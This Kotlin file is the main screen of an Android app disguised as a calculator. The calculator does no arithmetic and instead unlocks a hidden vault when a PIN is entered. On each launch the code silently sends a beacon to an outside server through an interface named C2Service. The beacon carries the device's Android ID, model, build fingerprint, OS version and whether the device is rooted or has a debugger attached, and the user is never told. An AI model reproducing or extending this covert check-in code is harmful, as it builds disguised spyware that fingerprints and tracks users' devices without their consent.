package org.kalkulator

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import org.kalkulator.api.C2Service
import org.kalkulator.model.CheckinRequest
import org.kalkulator.model.CheckinResponse
import org.kalkulator.utils.SecurityManager
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.io.File

class MainActivity : AppCompatActivity() {

    private lateinit var tvDisplay: TextView
    private var currentInput = ""
    private lateinit var securityManager: SecurityManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        securityManager = SecurityManager(this)
        
        if (securityManager.isFirstRun()) {
            startActivity(Intent(this, SetupActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_main)
        tvDisplay = findViewById(R.id.tvDisplay)

        setupButtons()
        performCheckin()
    }

    private fun setupButtons() {
        val buttons = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9,
            R.id.btnDot
        )

        for (id in buttons) {
            findViewById<Button>(id).setOnClickListener {
                if (securityManager.isLocked()) return@setOnClickListener
                val btn = it as Button
                currentInput += btn.text
                tvDisplay.text = currentInput
            }
        }

        findViewById<Button>(R.id.btnC).setOnClickListener {
            currentInput = ""
            tvDisplay.text = "0"
        }

        findViewById<Button>(R.id.btnEqual).setOnClickListener {
            if (securityManager.isLocked()) return@setOnClickListener
            
            if (securityManager.verifyPin(currentInput)) {
                securityManager.resetFailedAttempts()
                // Transition to Vault
                val intent = Intent(this, VaultActivity::class.java)
                startActivity(intent)
                overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
                currentInput = ""
                tvDisplay.text = "0"
            } else {
                // Incorrect PIN or normal math
                try {
                    // Logic normal math could go here
                    // If it looks like a PIN (e.g. 4-6 digits), track attempt
                    if (currentInput.length in 4..6) {
                        securityManager.incrementFailedAttempts()
                    }
                    tvDisplay.text = "0" 
                } catch (e: Exception) {
                    tvDisplay.text = "Error"
                }
                currentInput = ""
            }
        }
    }

    private fun performCheckin() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val request = CheckinRequest(
            deviceId = deviceId,
            model = Build.MODEL,
            manufacturer = Build.MANUFACTURER,
            androidVersion = Build.VERSION.RELEASE,
            buildFingerprint = Build.FINGERPRINT,
            isRooted = isDeviceRooted(),
            isDebugger = android.os.Debug.isDebuggerConnected()
        )

        val retrofit = Retrofit.Builder()
            .baseUrl("https://opm-jet.vercel.app/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()

        val service = retrofit.create(C2Service::class.java)
        service.checkin(request).enqueue(object : Callback<CheckinResponse> {
            override fun onResponse(call: Call<CheckinResponse>, response: Response<CheckinResponse>) {
                // Background checkin, no UI feedback
            }
            override fun onFailure(call: Call<CheckinResponse>, t: Throwable) {}
        })
    }

    private fun isDeviceRooted(): Boolean {
        val paths = arrayOf("/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su")
        return paths.any { File(it).exists() }
    }
}
